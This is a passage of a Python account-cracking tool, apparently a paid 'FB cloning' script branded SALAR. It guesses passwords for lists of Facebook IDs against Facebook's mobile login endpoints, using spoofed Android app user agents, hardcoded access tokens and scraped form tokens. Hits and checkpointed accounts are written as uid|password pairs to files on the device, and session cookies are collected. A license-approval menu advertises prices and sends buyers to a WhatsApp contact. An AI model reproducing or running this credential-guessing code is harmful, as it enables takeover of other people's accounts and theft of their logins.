                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        #ua = #'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.97,width=720,height=1612};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': u4s(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '45204',
'X-FB-SIM-HNI': '45201',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '698'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m[SALAR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SALAR-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\033[91;1m[SALAR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SALAR-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#----------[salar random cloning 2 method]----------#                
def rand2(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m[\033[1;91mSALAR-M2\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China','Awcc','Mtn','Salaam','Etisalat','Roshan'])
                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"  
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m[SALAR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/SALAR-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SALAR-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\033[91;1m[SALAR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SALAR-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#----------[salar random cloning 3 method]----------#
def rand3(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m[\033[1;91mSALAR-M3\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			ua = random.choice(ugen)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'p.facebook.com',
			'upgrade-insecure-requests': '1',
			'viewport-width': '980',
			'method': 'path',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
			'dnt':'1', 
			'x-requested-with':'mark.via.gp', 
			'sec-fetch-site': 'none',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			"sec-ch-prefers-color-scheme": "light",
			'user-agent': ua}
			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				if uid in oks:pass
				else:
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m[SALAR-2F] '+uid+' | '+pas)
					else:
						print(f'\r\033[1;35m[SALAR-OK] '+uid+' | '+pas)
						open('/sdcard/SALAR-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid=coki[141:156]
				if uid in cps:pass
				else:
					print('\r\r\x1b[38;5;205m[SALAR-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/SALAR-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except:
		pass
#----------[salar paid approval menu]----------#
def approval():
    os.system("clear")
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('Salar2x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f"\033[1;37m[•] 𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 : \x1b[1;31m"+Xyteee)
    print("\033[1;37m======================================================")
    try:
        system = requests.get("https://raw.githubusercontent.com/SaLarKhAnOo2003/approval/main/approval.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            menu()
            pass 
        else: 
            print('\033[1;37m[•] 𝐍𝐎𝐖 𝐈𝐓 𝐖𝐈𝐋𝐋 𝐖𝐎𝐑𝐊 𝐖𝐄𝐋𝐋 𝐈𝐍 𝐀𝐋𝐋 𝐂𝐎𝐔𝐍𝐓𝐑𝐈𝐄𝐒')
            print('\033[1;37m======================================================')
            print('\033[1;37m[•] 𝐍𝐎𝐓𝐄𝐒 : 𝐒𝐀𝐋𝐀𝐑 𝐓𝐎𝐎𝐋𝐒 𝐂𝐀𝐍 𝐁𝐔𝐘 𝐈𝐍 𝐀𝐋𝐋 𝐂𝐎𝐔𝐍𝐓𝐑𝐈𝐄𝐒')
            print('\033[1;37m======================================================')
            print('\033[1;37m[•] 𝐏𝐀𝐈𝐃 𝐀𝐅𝐆 <> 𝐏𝐀𝐊')
            print('\033[1;37m======================================================')
            print('\033[1;37m[•] 𝐅𝐎𝐑 5 𝐃𝐀𝐘𝐒   50 𝐀𝐅𝐆 || 𝐅𝐎𝐑 5 𝐃𝐀𝐘𝐒  150 𝐏𝐊𝐑')
            print('\033[1;37m[•] 𝐅𝐎𝐑 10 𝐃𝐀𝐘𝐒 100 𝐀𝐅𝐆 || 𝐅𝐎𝐑 10 𝐃𝐀𝐘𝐒 300 𝐏𝐊𝐑')
            print('\033[1;37m[•] 𝐅𝐎𝐑 15 𝐃𝐀𝐘𝐒 150 𝐀𝐅𝐆 || 𝐅𝐎𝐑 15 𝐃𝐀𝐘𝐒 350 𝐏𝐊𝐑')
            print('\033[1;37m[•] 𝐅𝐎𝐑 30 𝐃𝐀𝐘𝐒 300 𝐀𝐅𝐆 || 𝐅𝐎𝐑 30 𝐃𝐀𝐘𝐒 400 𝐏𝐊𝐑')
            print('\033[1;37m======================================================')
            print('\033[1;37m[1]  𝐀𝐏𝐏𝐑𝐎𝐕𝐀𝐋 𝐅𝐎𝐑 1 𝐌𝐎𝐍𝐓𝐇')
            print('\033[1;37m[2]  𝐀𝐏𝐏𝐑𝐎𝐕𝐀𝐋 𝐅𝐎𝐑 15 𝐃𝐀𝐘𝐒')
            print('\033[1;37m[3]  𝐀𝐏𝐏𝐑𝐎𝐕𝐀𝐋 𝐅𝐎𝐑 10 𝐃𝐀𝐘𝐒')
            print('\033[1;37m[4]  𝐀𝐏𝐏𝐑𝐎𝐕𝐀𝐋 𝐅𝐎𝐑 5 𝐃𝐀𝐘𝐒')
            print('\033[1;37m======================================================')
            Picchi = input(' Select Buy Option : ')
            os.system("clear")
            print(logo)
            print(f"\033[1;37m[•] 𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 :\033[31;1m{Xyteee}")
            print('\033[1;37m======================================================')
            print("\033[1;37m[•] 𝐓𝐎𝐎𝐋𝐒    : 𝐅𝐁 𝐂𝐋𝐎𝐍𝐈𝐍𝐆");
            print('\033[1;37m======================================================')
            print("\033[1;37m[•] 𝐍𝐎𝐓𝐄: 𝐋𝐅 𝐘𝐎𝐔 𝐀𝐑𝐄 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐃𝐎𝐍𝐓 𝐂𝐎𝐌𝐄 𝐈𝐁")
            print('\033[1;37m======================================================')
            print('\033[1;37m[•] 𝐅𝐈𝐋𝐄 𝐂𝐑𝐀𝐂𝐊 \n[•] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊 \n[•] 𝐆𝐌𝐀𝐈𝐋 𝐂𝐑𝐀𝐂𝐊 \n[•] 𝐎𝐋𝐃 𝐂𝐑𝐀𝐂𝐊 \n[•] 𝐄𝐗𝐈𝐓 𝐏𝐑𝐎𝐆𝐑𝐀𝐌')
            print("\033[1;37m======================================================")
            url_wa = "https://api.whatsapp.com/send?phone=+93707266012&text="
            choice = input(" Enter your choice  : ")
            tks = ("Hi Salar Sir, I Need To Buy Your Salar Tools Version 1.0.8 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
            subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
            print('\033[1;37m======================================================\n Run again with permission from admin')
            approval()
    except: 
        sys.exit()
try:
	menu()
	#approval()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()